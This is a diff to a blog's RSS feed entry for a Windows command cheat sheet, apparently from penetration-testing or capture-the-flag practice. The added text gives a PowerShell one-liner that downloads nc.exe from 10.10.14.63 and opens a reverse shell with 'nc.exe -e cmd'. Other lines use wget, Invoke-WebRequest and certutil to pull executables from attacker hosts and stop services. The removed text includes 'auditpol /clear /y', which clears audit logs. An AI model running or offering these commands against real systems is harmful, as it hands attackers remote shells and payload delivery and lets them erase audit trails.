@@ -16,10 +16,8 @@
       <pubDate>Sun, 30 Dec 2018 08:53:12 +0100</pubDate>
       
       <guid>https://sosprz.github.io/posts/windows-cmd/</guid>
-      <description>Various commands  type get-content dir /ah whoami dir /s where /r c:\Windows bash.* START filenae.lnk where /r c:\ wsl.conf 
-How to download file wget wget http://10.10.18.70:8000/taskkill.exe -OutFile taskkill.exe  Invoke-WebRequest Invoke-WebRequest http://10.10.18.70:8000/taskkill.exe -OutFile taskkill.exe Certutil certutil.exe -urlcache -split -f http://10.10.10.10/file.xml file.xml
-Manage services Restart-Service -Name &amp;ldquo;Ubiquiti UniFi Video&amp;rdquo; Stop-Service -Name &amp;ldquo;Ubiquiti UniFi Video&amp;rdquo;
-Clear Logs auditpol /clear /y</description>
+      <description>Various commands  type get-content dir /ah whoami dir /s where /r c:\Windows bash.* START filenae.lnk where /r c:\ wsl.conf  ### Download and run reverse shell powershell &#34;Invoke-WebRequest &#39;http://10.10.14.63:8000/nc.exe&#39; -OutFile &#39;C:\Users\public\nc.exe&#39;&#34;; C:\Users\public\nc.exe -e cmd 10.10.14.63 8888 How to download file wget wget http://10.10.18.70:8000/taskkill.exe -OutFile taskkill.exe  Invoke-WebRequest Invoke-WebRequest http://10.10.18.70:8000/taskkill.exe -OutFile taskkill.exe Certutil certutil.exe -urlcache -split -f http://10.10.10.10/file.xml file.xml
+Manage services Restart-Service -Name &amp;ldquo;Ubiquiti UniFi Video&amp;rdquo; Stop-Service -Name &amp;ldquo;Ubiquiti UniFi Video&amp;rdquo;</description>
     </item>
     
   </channel>
